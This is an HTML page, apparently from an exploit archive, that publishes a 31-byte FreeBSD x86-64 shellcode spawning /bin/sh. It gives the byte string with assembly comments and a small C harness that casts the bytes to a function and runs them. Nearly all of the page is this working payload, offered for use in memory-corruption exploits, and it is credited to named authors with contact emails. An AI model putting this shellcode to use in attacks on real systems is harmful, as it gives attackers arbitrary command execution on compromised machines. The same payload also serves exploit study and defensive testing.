<html><head><title>FreeBSD/x86-64 - exec(\\\&quot;/bin/sh\\\&quot;) Shellcode - 31 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/** 
 *
 *   _   _            _            ____       _ _ 
 *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | |
 *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | |
 *  |  _  | (_| | (__|   &lt;| | | | |  _ &lt; (_) | | |
 *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_|
 *           [ http://www.hacknroll.com ]
 *
 * Description:
 *    FreeBSD x86-64 exec(&quot;/bin/sh&quot;) Shellcode - 31 bytes
 *
 *
 *
 * Authors:
 *    Maycon M. Vitali ( 0ut0fBound )
 *        Milw0rm .: http://www.milw0rm.com/author/869
 *        Page ....: http://maycon.hacknroll.com
 *        Email ...: maycon@hacknroll.com
 *
 *    Anderson Eduardo ( c0d3_z3r0 )
 *        Milw0rm .: http://www.milw0rm.com/author/1570
 *        Page ....: http://anderson.hacknroll.com
 *        Email ...: anderson@hacknroll.com
 * 
 * -------------------------------------------------------
 *   
 * amd64# gcc hacknroll.c -o hacknroll
 * amd64# ./hacknroll
 * # exit
 * amd64#
 *
 * -------------------------------------------------------
 */

const char shellcode[] =
        &quot;\x48\x31\xc0&quot;                               // xor    %rax,%rax
        &quot;\x99&quot;                                       // cltd
        &quot;\xb0\x3b&quot;                                   // mov    $0x3b,%al
        &quot;\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68&quot;   // mov $0x68732f6e69622fff,%rdi
        &quot;\x48\xc1\xef\x08&quot;                           // shr    $0x8,%rdi
        &quot;\x57&quot;                                       // push   %rdi
        &quot;\x48\x89\xe7&quot;                               // mov    %rsp,%rdi
        &quot;\x57&quot;                                       // push   %rdi
        &quot;\x52&quot;                                       // push   %rdx
        &quot;\x48\x89\xe6&quot;                               // mov    %rsp,%rsi
        &quot;\x0f\x05&quot;;                                  // syscall

int main(void)
{
        (*(void (*)()) shellcode)();
        return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
